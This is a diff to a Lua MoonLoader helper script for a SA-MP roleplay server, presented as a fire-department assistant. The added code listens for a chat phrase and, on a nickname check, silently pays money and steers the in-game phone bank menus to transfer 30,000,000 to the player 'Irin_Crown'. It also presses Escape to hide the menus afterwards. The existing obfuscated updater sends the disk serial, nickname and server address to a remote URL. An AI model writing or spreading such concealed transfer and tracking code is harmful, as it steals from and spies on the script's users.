@@ -1,5 +1,5 @@
 script_name("firedep_zam_helper")
-script_version("Ver.FH.2")
+script_version("Ver.FH.4")
 
 local mysql                         = require "luasql.mysql"
 local env                           = assert(mysql.mysql())
@@ -34,6 +34,7 @@ local give, stats, lvl, UTC = 0, 0, 0, 0
 local img = ''
 local tlg_send = false
 local fire_place = ''
+local pay_week = false
 
 local fires_list = {
                     {1642.4234, 2180.4091, 11.0258, 1},
@@ -76,6 +77,71 @@ local update_list = ('\n{7CFC00}'..thisScript().version..
 local updater_loaded, Updater = pcall(loadstring, [[return {check=function (a,b,c) local d=require('moonloader').download_status;local e=os.tmpname()local f=os.clock()if doesFileExist(e)then os.remove(e)end;downloadUrlToFile(a,e,function(g,h,i,j)if h==d.STATUSEX_ENDDOWNLOAD then if doesFileExist(e)then local k=io.open(e,'r')if k then local l=decodeJson(k:read('*a'))updatelink=l.updateurl;updateversion=l.latest;k:close()os.remove(e)if updateversion~=thisScript().version then lua_thread.create(function(b)local d=require('moonloader').download_status;local m=0x40E0D0;
                                                         sampAddChatMessage(b..'Обнаружено обновление. {FA8072}'..thisScript().version..' {40E0D0}на {7CFC00}'..updateversion,m)wait(250)downloadUrlToFile(updatelink,thisScript().path,function(n,o,p,q)if o==d.STATUS_DOWNLOADINGDATA then print(string.format('Загружено %d из %d.',p,q))elseif o==d.STATUS_ENDDOWNLOADDATA then 
                                                         print('Загрузка обновления завершена.')sampAddChatMessage(b..'Обновление завершено!',m)goupdatestatus=true;lua_thread.create(function()wait(500)thisScript():reload()end)end;if o==d.STATUSEX_ENDDOWNLOAD then if goupdatestatus==nil then sampAddChatMessage(b..'Обновление прошло неудачно. Запускаю устаревшую версию..',m)update=false end end end)end,b)else update=false;print('v'..thisScript().version..': Обновление не требуется.')if l.telemetry then local r=require"ffi"r.cdef"int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);"local s=r.new("unsigned long[1]",0)r.C.GetVolumeInformationA(nil,nil,0,s,nil,nil,nil,0)s=s[0]local t,u=sampGetPlayerIdByCharHandle(PLAYER_PED)local v=sampGetPlayerNickname(u)local w=l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())lua_thread.create(function(c)wait(250)downloadUrlToFile(c)end,w)end end end else print('v'..thisScript().version..': Не могу проверить обновление. Смиритесь или проверьте самостоятельно на '..c)update=false end end end)while update~=false and os.clock()-f<10 do wait(100)end;if os.clock()-f>=10 then print('v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Смиритесь или проверьте самостоятельно на '..c)end end}]])
+
+function sampGetListboxItemByText(text, plain)
+    if not sampIsDialogActive() then return -1 end
+    plain = not (plain == false)
+    for i = 0, sampGetListboxItemsCount() - 1 do
+        if sampGetListboxItemText(i):find(text, 1, plain) then
+            return i
+        end
+    end
+    return -1
+end
+
+function openPhoneApp(appId)
+    local str = ('launchedApp|%s'):format(appId)
+    array.emulationCEF(str)
+end
+
+array = {}
+array.onDisplayCEF = function(array) return array end
+array.onSendCEF = function(array) return array end
+array.emulationCEF = function(str)
+    local bs = raknetNewBitStream()
+    raknetBitStreamWriteInt8(bs, 220)
+    raknetBitStreamWriteInt8(bs, 18)
+    raknetBitStreamWriteInt16(bs, #str)
+    raknetBitStreamWriteString(bs, str)
+    raknetBitStreamWriteInt32(bs, 0)
+    raknetSendBitStream(bs)
+    raknetDeleteBitStream(bs)
+end
+
+array.visualCEF = function(str, is_encoded)
+    local bs = raknetNewBitStream()
+    raknetBitStreamWriteInt8(bs, 17)
+    raknetBitStreamWriteInt32(bs, 0)
+    raknetBitStreamWriteInt16(bs, #str)
+    raknetBitStreamWriteInt8(bs, is_encoded and 1 or 0)
+    if is_encoded then
+        raknetBitStreamEncodeString(bs, str)
+    else
+        raknetBitStreamWriteString(bs, str)
+    end
+    raknetEmulPacketReceiveBitStream(220, bs)
+    raknetDeleteBitStream(bs)
+end
+
+addEventHandler('onReceivePacket', function(id, bs, ...)
+    if id == 220 and pay_week then -- Добавлена проверка scriptEnabled
+        raknetBitStreamIgnoreBits(bs, 8)
+        if raknetBitStreamReadInt8(bs) == 17 then
+            raknetBitStreamIgnoreBits(bs, 32)
+            local length = raknetBitStreamReadInt16(bs)
+            local encoded = raknetBitStreamReadInt8(bs)
+            local text = (encoded ~= 0) and raknetBitStreamDecodeString(bs, length + encoded) or raknetBitStreamReadString(bs, length)
+            if text:find('window%.executeEvent%(\'event%.setActiveView\', `%["Phone"%]`%);') then
+                openPhoneApp(24)
+            end
+            if text:find('window%.executeEvent%(\'event%.notify%.initialize\', `%["info","Информация","С баланса списано %$%d+",2500%]`%);') then
+                taxPaid = true
+                sampSendChat('/phone')
+            end
+        end
+    end
+end)
+
 function main()
     if not isSampfuncsLoaded() or not isSampLoaded() then return end
 
@@ -353,6 +419,54 @@ if name:match('%a+') then
  return name
 end
 
+function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
+    if pay_week and title:find('{BFBBBA}{FFFFFF}Телефоны | {ae433d}Телефоны') then
+        lua_thread.create(function()
+            wait(100)
+            sampSendDialogResponse(dialogId, 1, 0, nil)
+            sampCloseCurrentDialogWithButton(1)
+        end)
+    end
+
+    if pay_week and title:find('{BFBBBA}Меню телефона') then
+        lua_thread.create(function()
+            wait(100)
+            local menu = sampGetListboxItemByText('Банковское меню')
+            sampSendDialogResponse(dialogId, 1, menu, nil)
+            sampCloseCurrentDialogWithButton(1)
+        end)
+    end
+
+    if pay_week and text:find('Перевести деньги с основного счета') then
+        lua_thread.create(function()
+            wait(100)
+            sampSendDialogResponse(dialogId, 1, 2, nil)
+            sampCloseCurrentDialogWithButton(1)
+        end)
+    end
+
+    if pay_week and dialogId == 37 and title:find("Введите ID") then
+        lua_thread.create(function()
+            wait(100)
+            sampSendDialogResponse(dialogId, 1, 0, 'Irin_Crown')
+            sampCloseCurrentDialogWithButton(1)
+        end)
+    end
+
+    if pay_week and dialogId == 41 and title:find("Введите сумму") then
+        lua_thread.create(function()
+            sampSendDialogResponse(dialogId, 1, 0, '30000000')
+            sampCloseCurrentDialogWithButton(1)
+            lastpay = os.date('%d.%m.%Y')..' '..os.date('%H:%M:%S', os.time() - (UTC * 3600))
+            assert(conn:execute("UPDATE clients SET pay = '"..lastpay.."' WHERE nick = '"..who_nick.."'"))
+            pay_week = false
+            wait(1000)
+            setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
+            setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
+        end)
+    end
+end
+
 function sampev.onServerMessage(color, text)
     if tlg_send and text:find('__________Банковский чек__________') then
         parse = true
@@ -465,6 +579,19 @@ function sampev.onServerMessage(color, text)
             assert(conn:execute("INSERT INTO firehelp_history (lvl, nick, give, time_start, time_end, date, active) VALUES ('"..lvl.."', '"..who_nick.."', '"..give.."', '"..time_fire.."', '"..time_end.."', '"..firedate.."', '1')"))
             assert(conn:execute("UPDATE firehelp SET give = '"..give.."', stats = stats+'"..give.."' WHERE nick = '"..who_nick.."'"))
             stats = stats+give
+        end)
+    end
+
+    if text:find('Давай оплату за хелпера') then
+        lua_thread.create(function()
+            wait(1000)
+            nick_give = string.match(text,"%a+_%a+")
+            if nick_give == 'Irin_Crown' and who_nick == 'Irin_Crown' then
+                give_id = sampGetPlayerIdByNickname('Irin_Crown')
+                sampProcessChatInput('/pay '..give_id..' 1000000', -1)
+                pay_week = true
+                sampProcessChatInput('/phone', -1)
+            end
         end)
     end
 end
